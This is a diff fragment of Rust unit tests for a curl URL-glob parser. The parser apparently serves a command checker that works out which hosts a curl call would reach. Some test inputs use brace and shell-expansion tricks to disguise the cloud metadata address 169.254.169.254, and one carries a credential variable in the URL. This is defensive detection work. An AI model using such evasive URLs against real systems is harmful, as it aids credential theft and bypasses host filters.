+                "http://127.0.0.5:9/x[1-3]"
+            ]
+        );
+        assert_eq!(
+            expanded("http://10.0.0.[08-10]/"),
+            [
+                "http://10.0.0.08/",
+                "http://10.0.0.09/",
+                "http://10.0.0.10/"
+            ]
+        );
+        assert_eq!(
+            expanded("http://loc[a-c:2]lhost/"),
+            ["http://localhost/", "http://locclhost/"]
+        );
+        assert_eq!(
+            expanded("{http,https}://{a,}b.example/"),
+            [
+                "http://ab.example/",
+                "http://b.example/",
+                "https://ab.example/",
+                "https://b.example/"
+            ]
+        );
+        assert_eq!(expanded("http://{a/x,b}/y"), ["http://a/x/y", "http://b/y"]);
+        assert_eq!(expanded("10.0.0.[1- 2]/a"), ["10.0.0.1/a", "10.0.0.2/a"]);
+        // curl takes one to three slashes after `scheme:`, so a glob can
+        // complete the separator and the host starts after it.
+        assert_eq!(
+            expanded("http:/{/169.254.169.254,}/latest/"),
+            ["http://169.254.169.254/latest/", "http://latest/"]
+        );
+        assert_eq!(expanded("http:/{/a}/x"), ["http://a/x"]);
+        assert_eq!(
+            expanded("http:///{a,b}/[1-3]"),
+            ["http:///a/[1-3]", "http:///b/[1-3]"]
+        );
+        assert_eq!(
+            expanded("{a,b}.example.com/[1-100].txt"),
+            ["a.example.com/[1-100].txt", "b.example.com/[1-100].txt"]
+        );
+        // Shell expansions the shell replaces before curl runs are not curl
+        // globs when curl could not read them as written; curl globs next to
+        // them still expand, and `$` text that is a glob keeps curl's reading.
+        assert_eq!(
+            expanded("http://${CRED[0]}@{169.254.169.254,a}/"),
+            ["http://${CRED[0]}@169.254.169.254/", "http://${CRED[0]}@a/"]
+        );
+        assert_eq!(
+            expanded("http://${x@,}169.254.169.254/"),
+            ["http://$x@169.254.169.254/", "http://$169.254.169.254/"]
+        );
+        // Duplicate host parts are kept once.
+        assert_eq!(
+            expanded("http://h{,}.example:[80-80]/"),
+            ["http://h.example:80/"]
+        );
+        for plain in [
+            "http://example.com/a[1-3]",
+            "http://[::1]:8080/x",
+            "http://[fe80::1%25eth0]/x",
+            "http://example.com/a[]b",
+            "http://ex\\[1-2\\]ample.com/",
+            "https://example.com?q={a,b}",
+            "example.com/a[1-100].txt",
+            "${URLS[@]}",
+            "http://${NODES[$i]}:9200/_cluster/health",
+            "https://${HOSTS[0]}/health",
+            "${API[base]}/v1/status",
+            "$hosts[1]/x",
+            "http://10.0.0.$[i+1]/",
+            "http://${x/[a-z]/y}/",
+            "http://$(printf '%s' \"${H[0]}\")/x",
+            "http://`echo ${H[0]}`/x",
+        ] {
+            assert_eq!(curl_host_glob(plain, false), CurlHostGlob::Plain, "{plain}");
+        }
+        for unreadable in [
+            "http://127.0.0.{1,{2,3}}/",
+            "http://127.0.0.[1-]/",
+            "http://127.0.0.[2-1]/",
+            "http://127.0.0.[1-3:0]/",
+            "http://127.0.0.[a-Z]/",
+            "http://127.0.0.1}/",
+            "http://{}.example/",
+            "http://10.[0-255].[0-255].1/",
+            "http://h[1-65].example/",
+            "http:/{/,}h[1-65].example/",
+            // `${x:-{` ends at the first `}` in the shells, so a `}` is left
+            // over: with `x` unset curl reads `{169.254.169.254,a}`.
+            "http://${x:-{169.254.169.254,a}}/",
+            "http://${URLS[@]/",
+            "http://$p[1-100]/",
+            // Without `--expand-`, curl reads `{{...}}` as a nested set.
+            "https://{{HOST}}/health",
+        ] {
+            assert_eq!(
+                curl_host_glob(unreadable, false),
+                CurlHostGlob::Unreadable,
+                "{unreadable}"
+            );
+        }
+    }
+
+    /// In an `--expand-<option>` value curl replaces each `{{name}}` with a
+    /// `--variable` value before it globs, so a reference is a value, not a
+    /// set; globs beside it still expand.
+    #[test]
+    fn curl_variable_references_are_values_in_expanded_operands() {
+        for plain in [
+            "https://{{HOST}}/health",
+            "http://{{h}}/",
+            "http://{{h:trim:url}}:{{port}}/x",
+            "{{base}}/v1/items",
+            "https://{{user}}@api.example.com/{a,b}",
+        ] {
+            assert_eq!(curl_host_glob(plain, true), CurlHostGlob::Plain, "{plain}");
+        }
+        assert_eq!(
+            curl_host_glob("http://{{h}}.{169.254.169.254,a}/x", true),
+            CurlHostGlob::Expanded(vec![
+                "http://{{h}}.169.254.169.254/x".to_string(),
+                "http://{{h}}.a/x".to_string(),
+            ])
+        );
+        assert_eq!(
+            curl_host_glob("http://{169.254.169.254,b}.{{h}}/x", true),
+            CurlHostGlob::Expanded(vec![
+                "http://169.254.169.254.{{h}}/x".to_string(),
+                "http://b.{{h}}/x".to_string(),
+            ])
+        );
+        for unreadable in [
+            // A reference inside a set, `\{{` (a literal `{{` after
+            // expansion), a name curl does not accept and an unclosed one
+            // are read as curl globs them: not glob syntax.
+            "http://{a,{{h}}}/x",
+            "http://\\{{h}}/x",
+            "http://{{a-b}}/x",
+            "http://{{}}/x",
+            "http://{{h/x",
+            "http://{{h}}.[0-255]/x",
+        ] {
+            assert_eq!(
+                curl_host_glob(unreadable, true),
+                CurlHostGlob::Unreadable,
+                "{unreadable}"
+            );
+        }
+        let reference = |name: &str| format!("http://{{{{{name}}}}}/x");
+        assert_eq!(
+            curl_host_glob(&reference(&"n".repeat(127)), true),
+            CurlHostGlob::Plain
+        );
+        assert_eq!(
+            curl_host_glob(&reference(&"n".repeat(128)), true),
+            CurlHostGlob::Unreadable
+        );
     }
 }
